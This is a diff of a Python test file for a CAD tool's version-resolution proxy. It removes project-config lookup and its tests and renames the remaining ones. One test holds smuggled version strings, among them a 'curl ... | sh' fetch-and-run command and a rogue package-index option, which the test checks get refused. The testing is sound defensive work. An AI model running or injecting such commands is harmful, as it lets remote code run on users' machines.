@@ -254,7 +254,7 @@ class ResolutionTests(Fixture):
         self.old, self.new, self.dev = self.registered("0.8.0"), self.registered("0.9.0"), self.registered("0.9.0-dev.20261024")
         self.records = installations.records(self.state)
 
-    def choose(self, args: list[str], environ: dict | None = None, cwd: str | None = None,
+    def choose(self, args: list[str], environ: dict | None = None,
                engines: list[dict] | None = None, shell: str | None = None) -> tuple[str, list[str]]:
         asked = []
 
@@ -262,7 +262,7 @@ class ResolutionTests(Fixture):
             asked.append(True)
             return engines or []
 
-        version, rest = proxy.named(args, environ or {}, cwd or str(self.root))
+        version, rest = proxy.named(args, environ or {})
         record = proxy.choose(version, self.records, running, shell)
         if version is not None:
             self.assertFalse(asked, "a version named asks no engine")
@@ -275,21 +275,9 @@ class ResolutionTests(Fixture):
         self.assertEqual(self.choose(["+0.8.0", "export", "a.xbf"], {"CADGEN_VERSION": "0.9.0"}), ("0.8.0", ["export", "a.xbf"]))
 
     def test_b_then_cadgen_version(self) -> None:
-        (self.root / "proj").mkdir()
-        (self.root / "proj" / "cadgen.toml").write_text('version = "0.9.0"\n', encoding="utf-8")
-        self.assertEqual(self.choose(["status"], {"CADGEN_VERSION": "0.8.0"}, str(self.root / "proj")), ("0.8.0", ["status"]))
+        self.assertEqual(self.choose(["status"], {"CADGEN_VERSION": "0.8.0"}), ("0.8.0", ["status"]))
 
-    def test_c_then_a_cadgen_toml_from_the_current_folder_up(self) -> None:
-        deep = self.root / "proj" / "parts" / "deep"
-        deep.mkdir(parents=True)
-        (self.root / "proj" / "cadgen.toml").write_text('version = "0.8.0"\n', encoding="utf-8")
-        (self.root / "proj" / "parts" / "cadgen.toml").write_text("[other]\nkey = 1\n", encoding="utf-8")  # says none
-        self.assertEqual(self.choose(["status"], cwd=str(deep)), ("0.8.0", ["status"]))
-        (self.root / "proj" / "parts" / "cadgen.toml").write_text("version = \n", encoding="utf-8")
-        with self.assertRaisesRegex(proxy.Refused, r"^cadgen: .*cadgen\.toml: "):
-            self.choose(["status"], cwd=str(deep))
-
-    def test_d_then_the_running_engine_this_hosts_server_holds(self) -> None:
+    def test_c_then_the_running_engine_this_hosts_server_holds(self) -> None:
         engines = [self.engine(self.new, claude_code=1), self.engine(self.old, codex=2)]
         self.assertEqual(self.choose(["status"], engines=engines, shell="codex")[0], "0.8.0")
         self.assertEqual(self.choose(["status"], engines=engines, shell="claude code")[0], "0.9.0")
@@ -297,21 +285,19 @@ class ResolutionTests(Fixture):
         listed = [{**self.engine(self.new), "hosts": ["claude code"]}, {**self.engine(self.old), "hosts": ["codex"]}]
         self.assertEqual(self.choose(["status"], engines=listed, shell="codex")[0], "0.8.0")
         odd = [{**self.engine(self.new), "hosts": "codex"}, {**self.engine(self.old), "hosts": None}]
-        self.assertEqual(self.choose(["status"], engines=odd, shell="codex")[0], "0.9.0", "(e): the newest running")
+        self.assertEqual(self.choose(["status"], engines=odd, shell="codex")[0], "0.9.0", "(d): the newest running")
 
-    def test_e_then_any_running_engine_newest_first(self) -> None:
+    def test_d_then_any_running_engine_newest_first(self) -> None:
         engines = [self.engine(self.old), self.engine(self.dev, codex=1)]
         self.assertEqual(self.choose(["status"], engines=engines, shell="claude code")[0], "0.9.0-dev.20261024")
         self.assertEqual(self.choose(["status"], engines=[self.engine(self.old)])[0], "0.8.0")
 
-    def test_f_then_the_newest_registered(self) -> None:
+    def test_e_then_the_newest_registered(self) -> None:
         self.assertEqual(self.choose(["status"])[0], "0.9.0", "a release is newer than its development builds")
         os.unlink(self.new["python"])
         self.assertEqual(self.choose(["status"])[0], "0.9.0-dev.20261024", "an installation that is gone is passed over")
 
     def test_a_shell_whose_folder_was_removed_still_resolves(self) -> None:
-        self.assertEqual(proxy.named(["+0.8.0", "status"], {}, None), ("0.8.0", ["status"]))
-        self.assertEqual(proxy.named(["status"], {}, None), (None, ["status"]))
         with mock.patch("os.getcwd", side_effect=FileNotFoundError(2, "No such file or directory")), \
                 mock.patch("cadgen._internal.installations.records", return_value=[]):
             self.assertEqual(proxy.main(["+0.8.0", "status"]), 1, "refused in its line, never a traceback")
@@ -327,34 +313,18 @@ class ResolutionTests(Fixture):
             self.choose(["+0.8.0"])
 
     def test_only_a_version_is_named_and_none_is_echoed_into_a_command(self) -> None:
-        # A downloaded project's cadgen.toml (or a variable, or the first argument) whose version
-        # carries a shell command or a uv option: refused, and the refusal names no command.
-        (self.root / "proj").mkdir()
-        config = self.root / "proj" / "cadgen.toml"
+        # A variable or first argument carrying a shell command or a uv option: refused,
+        # and the refusal names no command.
         for planted in ("0.8.0 cadgen doctor; curl -fsSL https://example.invalid | sh; echo",
                         "0.8.0 --index-url https://example.invalid/simple", "0.8.0\x1b[2J", "-0.8.0"):
-            config.write_text(f"version = {json.dumps(planted)}\n", encoding="utf-8")
-            for args, environ in ((["status"], {}), ([f"+{planted}", "status"], {}), (["status"], {"CADGEN_VERSION": planted})):
+            for args, environ in (([f"+{planted}", "status"], {}), (["status"], {"CADGEN_VERSION": planted})):
                 with self.subTest(planted=planted, args=args, environ=environ):
                     with self.assertRaises(proxy.Refused) as refused:
-                        self.choose(args, environ, str(self.root / "proj"))
+                        self.choose(args, environ)
                     said = str(refused.exception)
                     self.assertNotIn("uvx", said)
                     self.assertNotIn("\x1b", said)
                     self.assertIn("names no cadgen version", said)
-
-    @POSIX
-    def test_a_cadgen_toml_everyone_may_write_names_nothing(self) -> None:
-        (self.root / "shared" / "mine").mkdir(parents=True)
-        config = self.root / "shared" / "cadgen.toml"
-        config.write_text('version = "0.8.0"\n', encoding="utf-8")
-        os.chmod(config, 0o666)  # as one another user left in a shared folder would be to this one
-        self.assertEqual(self.choose(["status"], cwd=str(self.root / "shared" / "mine"))[0], "0.9.0",
-                         "passed over: the newest registered runs")
-        os.chmod(config, 0o644)
-        self.assertEqual(self.choose(["status"], cwd=str(self.root / "shared" / "mine"))[0], "0.8.0")
-        with mock.patch.object(proxy.os, "getuid", return_value=os.getuid() + 1):  # another user's file
-            self.assertEqual(self.choose(["status"], cwd=str(self.root / "shared" / "mine"))[0], "0.9.0")
 
     def test_run_execs_the_installations_python_and_anything_else_its_cadgen(self) -> None:
         self.assertEqual(proxy.command(self.old, ["run", "model.py", "--force"]), [self.old["python"], "model.py", "--force"])
